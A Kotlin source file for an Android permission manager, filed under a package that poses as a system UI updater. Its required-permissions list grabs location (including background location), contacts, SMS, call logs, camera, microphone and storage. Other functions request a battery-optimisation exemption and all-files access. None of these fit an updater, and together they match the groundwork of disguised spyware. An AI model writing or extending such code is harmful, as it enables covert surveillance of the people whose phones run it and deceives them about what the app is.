package com.android.systemui.updater

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * Manages permission requests and results for the updater module.
 */
class PermissionManager(private val activity: Activity) {

    companion object {
        const val PERMISSION_REQUEST_CODE = 100
        const val BATTERY_OPTIMIZATION_REQUEST = 101
        const val MANAGE_EXTERNAL_STORAGE_REQUEST = 102
    }

    /**
     * Returns a list of dangerous permissions required by the updater.
     */
    fun getRequiredPermissions(): List<String> {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        // Add background location permission for Android Q and above
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return permissions
    }

    /**
     * Checks if all required permissions are granted.
     */
    fun areAllPermissionsGranted(): Boolean {
        return getRequiredPermissions().all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Requests all required dangerous permissions that are not yet granted.
     * If all permissions are already granted, the callback is invoked immediately with true.
     * Otherwise, the standard permission request flow is initiated.
     */
    fun requestRequiredPermissions(callback: PermissionCallback) {
        val permissionsToRequest = getRequiredPermissions().filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isEmpty()) {
            callback.onPermissionResult(true)
        } else {
            ActivityCompat.requestPermissions(
                activity,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
            // Store callback for later use in onRequestPermissionsResult
            this.pendingCallback = callback
        }
    }

    /**
     * Handles the result of a permission request.
     * Should be called from the activity's onRequestPermissionsResult method.
     */
    fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ): Boolean {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            pendingCallback?.onPermissionResult(allGranted)
            pendingCallback = null
            return true
        }
        return false
    }

    /**
     * Checks if battery optimization exemption is granted (for Android Oreo and above).
     */
    fun isBatteryOptimizationExempted(): Boolean {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.O) {
            return true
        }
        val powerManager = activity.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isIgnoringBatteryOptimizations(activity.packageName)
    }

    /**
     * Requests battery optimization exemption.
     * Should be called from the activity and the result handled in onActivityResult.
     */
    fun requestBatteryOptimizationExemption() {
        val intent = android.content.Intent(
            android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
        ).apply {
            data = android.net.Uri.parse("package:${activity.packageName}")
        }
        activity.startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST)
    }

    /**
     * Checks if manage external storage permission is granted (for Android R and above).
     */
    fun isManageExternalStorageGranted(): Boolean {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            return true
        }
        return android.os.Environment.isExternalStorageManager()
    }

    /**
     * Requests manage external storage permission.
     * Should be called from the activity and the result handled in onActivityResult.
     */
    fun requestManageExternalStoragePermission() {
        try {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
            ).apply {
                data = android.net.Uri.parse("package:${activity.packageName}")
            }
            activity.startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        } catch (e: Exception) {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
            )
            activity.startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        }
    }

    // Callback for permission results
    interface PermissionCallback {
        fun onPermissionResult(allGranted: Boolean)
    }

    // Pending callback to be invoked when the permission request result is received
    private var pendingCallback: PermissionCallback? = null
}